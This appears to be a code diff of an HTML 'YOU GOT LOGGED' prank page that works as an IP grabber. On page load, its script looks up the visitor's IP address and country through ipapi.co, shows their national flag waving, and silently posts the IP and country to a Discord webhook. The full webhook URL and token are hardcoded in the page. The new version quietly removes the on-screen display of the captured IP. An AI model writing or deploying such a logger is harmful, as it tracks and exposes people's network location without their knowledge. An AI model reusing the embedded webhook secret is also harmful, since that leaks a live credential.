@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Error</title>
+    <title>Connection Established</title>
     <style>
         body {
             background-color: #000;
@@ -24,77 +24,73 @@
             text-transform: uppercase;
             letter-spacing: 8px;
             color: #fff;
-            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 40px #fff;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .info-box {
-            font-size: 1.1rem;
-            color: #888;
+            text-shadow: 0 0 10px #fff, 0 0 20px #fff;
             margin-bottom: 50px;
-            text-align: center;
         }
 
-        #ip, #country { color: #fff; font-weight: bold; }
-
-        /* Flag & Pole Setup */
+        /* Flag Scene */
         .scene {
-            position: relative;
             display: flex;
             align-items: flex-start;
+            perspective: 1000px;
         }
 
         /* The Pole */
         .pole {
-            width: 8px;
-            height: 250px;
-            background: linear-gradient(90deg, #333, #777, #333);
-            border-radius: 4px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            width: 10px;
+            height: 300px;
+            background: linear-gradient(90deg, #222, #aaa, #222);
+            border-radius: 5px;
+            z-index: 2;
         }
 
-        /* The Real Waving Flag */
+        /* The Waving Cloth */
         .flag-cloth {
-            width: 220px;
-            height: 140px;
+            width: 250px;
+            height: 150px;
             background-size: cover;
-            background-position: center;
-            /* The "Real Wave" Effect using a mesh-like distortion */
-            animation: flag-wave 3s i-out infinite;
+            background-position: left center;
+            position: relative;
+            
+            /* Combined 3D Wave & Shadow Animation */
+            animation: 
+                wave-3d 3s ease-in-out infinite,
+                shadow-ripple 3s linear infinite;
+                
             transform-origin: left center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-            /* Mask to make it look like cloth */
-            mask-image: linear-gradient(to right, rgba(0,0,0,1) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,1) 100%);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            margin-left: -2px; /* Pulls it flush against the pole */
         }
 
-        @keyframes flag-wave {
+        /* 3D Cloth Bending */
+        @keyframes wave-3d {
+            0%, 100% { transform: rotateY(10deg) rotateX(2deg) skewY(-2deg); }
+            50% { transform: rotateY(-15deg) rotateX(-2deg) skewY(2deg); }
+        }
+
+        /* This creates the moving "shadow" across the flag for a fabric look */
+        @keyframes shadow-ripple {
             0% { 
-                transform: perspective(1000px) rotateY(0deg) rotateX(0deg); 
-            }
-            25% { 
-                transform: perspective(1000px) rotateY(15deg) rotateX(2deg) skewY(-2deg); 
-            }
-            50% { 
-                transform: perspective(1000px) rotateY(0deg) rotateX(-2deg) skewY(2deg); 
-            }
-            75% { 
-                transform: perspective(1000px) rotateY(-15deg) rotateX(2deg) skewY(-2deg); 
+                background-image: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(0,0,0,0.2) 20%, rgba(255,255,255,0) 40%);
+                background-color: transparent;
             }
             100% { 
-                transform: perspective(1000px) rotateY(0deg) rotateX(0deg); 
+                background-image: linear-gradient(90deg, rgba(255,255,255,0) 60%, rgba(0,0,0,0.2) 80%, rgba(255,255,255,0) 100%);
             }
+        }
+
+        /* Adding a "Glow" to the flag edges */
+        .flag-cloth::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            box-shadow: inset 0 0 20px rgba(255,255,255,0.1);
         }
     </style>
 </head>
 <body>
 
     <div class="status-text">YOU GOT LOGGED</div>
-    
-    <div class="info-box">
-        <p>ADDRESS: <span id="ip">INTERCEPTING...</span></p>
-        <p>ORIGIN: <span id="country">LOCATING...</span></p>
-    </div>
 
     <div class="scene">
         <div class="pole"></div>
@@ -104,45 +100,34 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";
 
-        async function initLogger() {
+        async function start() {
             try {
-                // Using ipapi for stable flag codes
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                document.getElementById('ip').innerText = data.ip;
-                document.getElementById('country').innerText = data.country_name.toUpperCase();
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
                 
-                // Set the background image of the cloth to the user's flag
+                // Set flag image
                 const code = data.country_code.toLowerCase();
                 const flagUrl = `https://flagcdn.com/w640/${code}.png`;
-                document.getElementById('flag').style.backgroundImage = `url('${flagUrl}')`;
+                
+                // We apply the flag image via background style
+                const flagElement = document.getElementById('flag');
+                flagElement.style.backgroundImage = `url('${flagUrl}')`;
 
-                // Discord Webhook
-                await fetch(WEBHOOK_URL, {
+                // Webhook Log
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "💀 DATA CAPTURED",
-                            color: 0,
-                            fields: [
-                                { name: "IP Address", value: `\`${data.ip}\``, inline: true },
-                                { name: "Location", value: `${data.country_name}`, inline: true },
-                                { name: "City", value: `${data.city}`, inline: true }
-                            ],
-                            footer: { text: "Logger v3.0" },
-                            timestamp: new Date()
+                            title: "🚩 FLAG RENDERED",
+                            description: `IP: **${data.ip}**\nCountry: **${data.country_name}**`,
+                            color: 16777215 // White
                         }]
                     })
                 });
-
-            } catch (err) {
-                console.error("Logger Failed");
-            }
+            } catch(e) {}
         }
-
-        window.onload = initLogger;
+        start();
     </script>
 </body>
 </html>
